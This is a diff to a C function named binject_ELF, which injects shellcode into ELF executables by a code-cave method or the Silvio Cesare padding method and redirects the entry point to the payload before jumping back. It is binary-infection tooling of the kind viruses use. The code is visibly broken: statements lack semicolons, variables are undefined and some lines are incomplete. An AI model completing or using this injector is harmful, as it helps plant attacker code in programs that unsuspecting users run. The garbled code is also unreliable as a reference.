@@ -1,6 +1,6 @@
 int binject_ELF(char *file,char *shellcode,int method)
 {
-  uint32_t size;
+  uint32_t size,oryginal_entry;
   int i,x;
   int sclen=strlen(shellcode);
   FILE *f;
@@ -10,9 +10,10 @@ int binject_ELF(char *file,char *shellcode,int method)
   char *file_buffer = calloc(1,size);
   char *address=file_buffer;
   struct Elf32_Ehdr ehdr=(struct Elf32_Ehdr*)address;
+  oryginal_entry=ehdr.e_entry;
   if(method==CODE_CAVE)
   {
-	  address= file_buffer + ehdr->e_shoff;
+	  address+=ehdr->e_shoff;
   for(i=0;i<ehdr.shnum;i++)
   {       
 	  struct Elf32_shdr shdr=(struct Elf32_Shdr*)address;
@@ -21,7 +22,9 @@ int binject_ELF(char *file,char *shellcode,int method)
        x=find_code_cave(sclen,section_start,section_end,file_buffer);
                         if(x!=0)
 			{
-                        memcpy(file_buffer+x,shellcodefixed,sclen+5)
+			sclen+=5
+			char *shellcodefixed= ApplySuffixJump
+                        memcpy(file_buffer+x,shellcodefixed,sclen)
 			fwrite(file_buffer,1,size,f);
 			free(shellcodefixed);
 			free(file_buffer);
@@ -31,27 +34,26 @@ int binject_ELF(char *file,char *shellcode,int method)
 			}
 				section_start+=shdr->sh_size;
   }
-                        if(x!=0)
-                        return 1;
+                      return -1;
                         }
   if(method==SILVIO_METHOD)
   {
-	  address=file_buffer +ehdr->e_phoff
+	  address+=ehdr->e_phoff
 	  for (i = 0; i < ehdr.e_phnum; i++) {
 		  struct Elf32_phdr phdr= (struct Elf32_phdr*)address;
 		if (offset) {
 			phdr->p_offset += 4096;
 		} else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
 			
-			ehdr.e_entry = p_vaddr+p_filesz;
+			ehdr.e_entry = phdr->p_vaddr+phdr->p_filesz;
 			int palen;
 
 			if (phdr->p_filesz != phdr->p_memsz) goto error;
 
-			evaddr = phdr->p_vaddr + phdr->p_filesz;
-			palen = PAGE_SIZE - (evaddr & (PAGE_SIZE - 1));
+			
+			palen = PAGE_SIZE - (ehdr.e_entry & (PAGE_SIZE - 1));
 
-			if (palen < vlen)
+			if (palen < sclen)
 			
 
 			ehdr.e_entry = evaddr + ventry;
@@ -85,9 +87,10 @@ address=file_buffer+ehdr->e_shoff;
 	if (ehdr.e_shoff >= offset) ehdr.e_shoff += PAGE_SIZE;
 
  
-memcpy(file_buffer+offset,shellcodefixe,sclen+5);
+memcpy(file_buffer+offset,shellcodefixed,sclen);
   fwrite(file_buffer,1,size,f);
-  free(
+  free(shellcodefixed);
+  free(file_buffer);
 }
            
  
